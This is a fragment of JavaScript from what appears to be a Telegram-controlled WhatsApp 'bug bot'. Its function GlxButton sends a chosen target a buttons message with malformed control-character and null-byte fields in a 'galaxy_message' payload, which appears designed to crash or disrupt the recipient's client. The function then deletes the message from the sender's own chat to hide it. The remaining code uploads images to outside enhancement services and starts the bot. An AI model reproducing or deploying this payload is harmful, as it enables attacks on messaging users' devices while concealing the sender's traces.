}]
}]
});
}
async function GlxButton(target) {
 const msg = await generateWAMessageFromContent(target, {
    message: {
     buttonsMessage: {
      contentText: "☏ 𝐍𝐭𝐞𝐝 𝐂𝐚𝐥𝐥𝐞𝐝 𝐘𝐨𝐮 ☏",
      buttons: [
       {
         buttonId: "x",
         buttonText: {
          displayText: "\x10"
         },
         type: 2,
         nativeFlowInfo: {
          name: "galaxy_message",
          paramsJson: "\0"
         }
       },
     ]
   }
 }
}, {});
 
 await sock.relayMessage(target, msg.message, {
     messageId: msg.key.id
   })
  await sleep(1000)
  await sock.chatModify(
    {
      clear: {
        messages: [
          {
            id: msg.key.id,
            fromMe: msg.key.fromMe,
            timestamp: msg.messageTimestamp.low
          }
        ]
      }
    }, target )
}

async function remini(imagePath) {
  return new Promise((resolve, reject) => {
    const form = new FormData();
    form.append('model_version', 1);
    form.append('image', fs.readFileSync(imagePath), {
      filename: 'image.jpg',
      contentType: 'image/jpeg'
    });

    const req = form.submit({
      protocol: 'https:',
      host: 'inferenceengine.vyro.ai',
      path: '/enhance',
      headers: {
        'User-Agent': 'okhttp/4.9.3',
        'Accept-Encoding': 'gzip'
      }
    }, (err, res) => {
      if (err) return reject(err);
      const chunks = [];
      res.on('data', chunk => chunks.push(chunk));
      res.on('end', () => resolve(Buffer.concat(chunks)));
      res.on('error', reject);
    });
  });
}

async function Pxpic(path, func) {
  const tool = ['removebg', 'enhance', 'upscale', 'restore', 'colorize'];
  if (!tool.includes(func)) return null;

  const buffer = fs.readFileSync(path);
  
  const fileInfo = await fileType.fromBuffer(buffer);
  const ext = fileInfo?.ext || 'jpg';
  const mime = fileInfo?.mime || 'image/jpeg';
  const fileName = Math.random().toString(36).slice(2, 8) + '.' + ext;

  const { data } = await axios.post("https://pxpic.com/getSignedUrl", {
    folder: "uploads",
    fileName
  });

  await axios.put(data.presignedUrl, buffer, {
    headers: { "Content-Type": mime }
  });

  const url = "https://files.fotoenhancer.com/uploads/" + fileName;

  const api = await axios.post("https://pxpic.com/callAiFunction", new URLSearchParams({
    imageUrl: url,
    targetFormat: 'png',
    needCompress: 'no',
    imageQuality: '100',
    compressLevel: '6',
    fileOriginalExtension: 'png',
    aiFunction: func,
    upscalingLevel: ''
  }).toString(), {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0',
      'accept-language': 'id-ID'
    }
  });

  return api.data;
}

//

bot.launch().then(() => {
    setBotProfile(bot);
}).catch(error => {
    console.error(error);
});